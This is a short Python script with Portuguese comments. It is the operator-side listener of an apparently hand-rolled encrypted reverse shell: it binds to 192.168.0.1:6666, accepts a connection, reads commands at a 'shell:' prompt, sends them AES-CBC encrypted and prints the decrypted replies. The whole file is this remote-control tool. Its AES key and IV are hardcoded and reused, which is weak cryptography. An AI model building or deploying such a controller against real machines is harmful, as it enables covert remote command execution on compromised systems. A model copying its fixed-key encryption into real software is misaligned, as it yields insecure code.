import socket

from Crypto.Cipher import AES
from Crypto.Util import Padding

IV = b"H" * 16 # chave secreta
key = b"H" * 32 # tamanho

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect():

    s = socket.socket()
    s.bind(('192.168.0.1', 6666))
    s.listen(1) 
    conn, address = s.accept()
    while True:

        entrada = input("shell: ")
        if 'sair' in entrada:
            conn.send(encrypt(b'sair'))
            conn.close()
            break
        else:
            entrada= encrypt(entrada.encode()) # protegida
            conn.send(entrada)# envia mensagem criptografada
            print(decrypt(conn.recv(1024)).decode())# mensagem cript